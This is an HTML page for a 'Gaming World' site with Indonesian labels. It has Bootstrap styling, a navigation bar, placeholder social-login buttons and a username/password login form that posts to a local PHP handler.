<!DOCTYPE html>
<html>

<head>

    <meta name="google-signin-scope" content="profile email">
    <meta name="google-signin-client_id" content="YOUR_CLIENT_ID.apps.googleusercontent.com">
    <script src="https://apis.google.com/js/platform.js" async defer></script>

  <title>Gaming World</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>

<style>

body { 
    background-color:rgb(255,136,0);
    opacity: 0,5;
    
    
    
    
}

.container-fluid {
  padding: 3px 15px;
}

.navbar {
  margin-bottom: 0;
    z-index: 9999;
    border: 0;
    font-size: 14px;
    line-height: 1.42857143;
    letter-spacing: 2px;
    border-radius: 0;
    font-family: Montserrat, sans-serif;
    opacity: 0.9;
}


* {box-sizing: border-box}

/* style the container */
.container {
  background-position: center;
  border-radius: 10px;
  padding: 20px 0 30px 0;
  padding-top:50px;
  padding: 0px;
  border: 0;
  padding-top: 100px;
  background-color:white;


}

/* style inputs and link buttons */
input,
.btn {
  width: 100%;
  padding: 12px;
  border: none;
  border-radius: 4px;
  margin: 5px 0;
  opacity: 0.85;
  display: inline-block;
  font-size: 17px;
  line-height: 20px;
  text-decoration: none; /* remove underline from anchors */
}

input:hover,
.btn:hover {
  opacity: 1;
}

/* add appropriate colors to fb, twitter and google buttons */
.fb {
  background-color: #3B5998;
  color: white;
}

.twitter {
  background-color: #55ACEE;
  color: white;
}

.google {
  background-color: #dd4b39;
  color: white;
}

/* style the submit button */
input[type=submit] {
  background-color: #4CAF50;
  color: white;
  cursor: pointer;
}

input[type=submit]:hover {
  background-color: #45a049;
}

/* Two-column layout */
.col {
  float: left;
  width: 50%;
  margin: auto;
  padding: 0 50px;
  margin-top: 6px;
}

/* Clear floats after the columns */
.row:after {
  content: "";
  display: table;
  clear: both;
}

/* vertical line */
.vl {
  position: absolute;
  left: 50%;
  transform: translate(-50%);
  padding-top:70px;
  height: 175px;
}

/* text inside the vertical line */
.inner {
  position: absolute;
  top: 50%;
  transform: translate(-50%, -50%);
  background-color: #f1f1f1;
  border: 1px solid #ccc;
  border-radius: 50%;
  padding: 8px 10px;
}

/* hide some text on medium and large screens */
.hide-md-lg {
  display: none;
}

/* bottom container */
.bottom-container {
  text-align: center;
  background-color: #666;
  border-radius: 0px 0px 4px 4px;
  
  
}

/* Responsive layout - when the screen is less than 650px wide, make the two columns stack on top of each other instead of next to each other */
@media screen and (max-width: 650px) {
  .col {
    width: 100%;
    margin-top: 0;
  }
  /* hide the vertical line */
  .vl {
    display: none;
  }
  /* show the hidden text on small screens */
  .hide-md-lg {
    display: block;
    text-align: center;
  }
}


</style>
</head>

<body>

  
  <nav class="navbar navbar-fixed-top navbar-inverse">
    <div class="container-fluid">
      <div class="navbar-header">
        <a class="navbar-brand" href="#">GamingWorld</a>
      </div>
      <ul class="nav navbar-nav">
        <li><a href="#">Home</a></li>
        <li><a href="#">Gaming News</a></li>
        <li><a href="#">Daily Spin</a></li>
      </ul>
      <ul class="nav navbar-nav navbar-right">
        <li><a href="#"><span class="glyphicon glyphicon-user"></span> Daftar</a></li>
        <li><a href="#"><span class="glyphicon glyphicon-log-in"></span> Masuk</a></li>
      </ul>
      <form class="navbar-form navbar-right" action="/action_page.php">
        <div class="input-group">
          <input type="text" class="form-control" placeholder="Search">
          <div class="input-group-btn">
            <button class="btn btn-default" type="submit">
              <i class="glyphicon glyphicon-search"></i>
            </button>
          </div>
        </div>
      </form>
    </div>
  </nav>



  <div class="homepage" id="home">
    <div class="game-page">
      
        
  </div>

  <div class="container">
      <form action="recive.php" method="POST">
        <div class="row">
          <h2 style="text-align:center">Login with Social Media or Manually</h2>
          <div class="vl">
            <span class="vl-innertext">or</span>
          </div>
    
          <div class="col">
            <a href="#" class="fb btn">
              <i class="fa fa-facebook fa-fw"></i> Login with Facebook
            </a>
            <a href="#" class="twitter btn">
              <i class="fa fa-twitter fa-fw"></i> Login with Twitter
            </a>
            <a href="#" class="google btn">
              <i class="fa fa-google fa-fw"></i> Login with Google+
            </a>
          </div>
    
          <div class="col">
            <div class="hide-md-lg">
              <p>Or sign in manually:</p>
            </div>
    
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Login">
          </div>
    
        </div>
      </form>
    </div>
    
    <div class="bottom-container">
      <div class="row">
        <div class="col">
          <a href="daftar.php" style="color:white" class="btn">Daftar</a>
        </div>
        <div class="col">
          <a href="#" style="color:white" class="btn">Lupa Password?</a>
        </div>
      </div>
    </div> 
      </div>
  </div>



</body>

</html>